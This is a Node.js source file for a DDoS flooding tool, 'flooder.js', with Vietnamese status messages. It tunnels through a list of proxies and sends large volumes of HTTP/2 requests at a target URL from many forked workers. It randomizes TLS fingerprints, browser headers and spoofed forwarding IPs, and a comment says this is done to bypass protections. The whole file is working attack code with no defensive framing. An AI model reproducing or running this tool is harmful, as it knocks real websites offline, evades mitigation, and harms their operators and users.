const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length < 7) {
    console.log(`Usage: node flooder.js <target_url> <time> <rate> <threads> <proxy_file>`);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function randomPayload(size) {
    return Buffer.from(randstr(size));
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]) || 48,
    proxyFile: process.argv[6]
};

const methods = ["GET", "POST", "DELETE", "PUT", "PATCH"];
const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'rsa_pss_rsae_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
    'ecdsa_secp384r1_sha384'
];

const ciphers = [
    'TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384',
    'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305'
];

const accept_header = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'application/json, text/plain, */*',
    'text/css,*/*;q=0.1',
    'application/javascript, */*;q=0.8'
];

const lang_header = [
    'en-US,en;q=0.9',
    'zh-CN,zh;q=0.8',
    'fr-FR,fr;q=0.9',
    'ja-JP,ja;q=0.8'
];

const encoding_header = [
    'gzip, deflate, br',
    'gzip, deflate',
    'br',
    '*'
];

const version = [
    '"Google Chrome";v="129", "Not=A?Brand";v="8", "Chromium";v="129"',
    '"Microsoft Edge";v="129", "Chromium";v="129"',
    '"Firefox";v="130", "Gecko";v="20100101"',
    '"Safari";v="17.6", "AppleWebKit";v="605.1.15"'
];

const referers = [
    'https://www.google.com/',
    'https://www.bing.com/',
    'https://www.facebook.com/',
    'https://' + url.parse(args.target).host + '/',
    ''
];

const platforms = [
    'Windows',
    'Macintosh',
    'Linux',
    'iPhone',
    'Android'
];

const custom_headers = [
    { 'x-forwarded-for': () => randstr(12) },
    { 'x-real-ip': () => randstr(12) },
    { 'via': () => `2.0 ${randstr(8)}.cloudfront.net` },
    { 'cache-control': () => randomElement(['no-cache', 'max-age=0', 'no-store']) },
    { 'pragma': 'no-cache' },
    { 'x-requested-with': 'XMLHttpRequest' }
];

const fake_paths = [
    '/api/v1/', '/login', '/signup', '/profile', '/search', '/assets', '/static', '/home'
];

const parsedTarget = url.parse(args.target);
const proxies = readLines(args.proxyFile);
let requestCounter = 0;

if (cluster.isMaster) {
    console.clear();
    console.log(`🎯 Mục tiêu: ${parsedTarget.host}`);
    console.log(`⏰ Thời gian: ${args.time} giây`);
    console.log(`🧵 Threads: ${args.threads}`);
    console.log(`🚀 Requests mỗi thread mỗi chu kỳ: ${args.rate}`);
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setInterval(() => {
        console.log(`📊 Tổng requests gửi: ${requestCounter}`);
    }, 5000);
    setTimeout(() => {
        console.log(`🏁 Kết thúc, tổng requests: ${requestCounter}`);
        process.exit(0);
    }, args.time * 1000);
} else {
    runFlooder();
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
        const buffer = Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
            noDelay: true
        });

        connection.setTimeout(options.timeout * 1000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            if (!chunk.toString("utf-8").includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "lỗi: proxy không hợp lệ");
            }
            return callback(connection);
        });

        connection.on("timeout", () => {
            connection.destroy();
            callback(undefined, "lỗi: hết thời gian");
        });

        connection.on("error", () => {
            connection.destroy();
            callback(undefined, "lỗi: kết nối thất bại");
        });
    }
}

const Socker = new NetSocket();

function generateHeaders() {
    const method = randomElement(methods);
    const path = Math.random() < 0.6 ? 
        `${parsedTarget.path}?${randstr(10)}=${randstr(8)}` : 
        randomElement(fake_paths) + `?${randstr(6)}=${randstr(4)}`;
    
    const headers = {
        ":method": method,
        ":authority": parsedTarget.host,
        ":path": path,
        ":scheme": "https",
        "sec-ch-ua": randomElement(version),
        "sec-ch-ua-platform": randomElement(platforms),
        "sec-ch-ua-mobile": Math.random() < 0.5 ? "?0" : "?1",
        "accept-encoding": randomElement(encoding_header),
        "accept-language": randomElement(lang_header),
        "accept": randomElement(accept_header),
        "referer": randomElement(referers),
        "sec-fetch-mode": randomElement(["navigate", "same-origin", "cors", "websocket"]),
        "sec-fetch-dest": randomElement(["document", "script", "style", "image", "empty"]),
        "sec-fetch-site": randomElement(["same-origin", "cross-site", "same-site", "none"]),
        "upgrade-insecure-requests": "1",
        "user-agent": `Mozilla/5.0 (${randomElement(platforms)}; ${Math.random() < 0.5 ? 'Win64; x64' : 'MacIntel'}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36`
    };

    // Thêm 2-4 header ngẫu nhiên để bypass
    for (let i = 0; i < randomIntn(2, 5); i++) {
        const header = randomElement(custom_headers);
        Object.assign(headers, typeof header[Object.keys(header)[0]] === 'function' ? 
            { [Object.keys(header)[0]]: header[Object.keys(header)[0]]() } : header);
    }

    return headers;
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 2
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error || !connection) {
            return setImmediate(runFlooder);
        }

        const tlsOptions = {
            secure: true,
            ALPNProtocols: randomElement([['h2'], ['h2', 'http/1.1'], ['http/1.1']]),
            ciphers: randomElement(ciphers),
            sigalgs: randomElement(sigalgs),
            ecdhCurve: randomElement(['P-256', 'P-384', 'P-521']),
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            socket: connection,
            secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_TICKET |
                crypto.constants.SSL_OP_NO_COMPRESSION |
                crypto.constants.SSL_OP_NO_RENEGOTIATION
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 10000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 65536,
                enablePush: false
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            function sendRequests() {
                for (let i = 0; i < args.rate; i++) {
                    const headers = generateHeaders();
                    const request = client.request(headers);
                    if (["POST", "PUT", "PATCH"].includes(headers[":method"])) {
                        request.write(randomPayload(randomIntn(100, 1000)));
                    }
                    requestCounter++;
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });
                    request.on("error", () => {
                        request.close();
                        request.destroy();
                    });
                    request.end();
                }
                if (Date.now() < Date.now() + args.time * 1000) {
                    setImmediate(sendRequests);
                }
            }
            setImmediate(sendRequests);
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setImmediate(runFlooder);
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
            setImmediate(runFlooder);
        });
    });
}
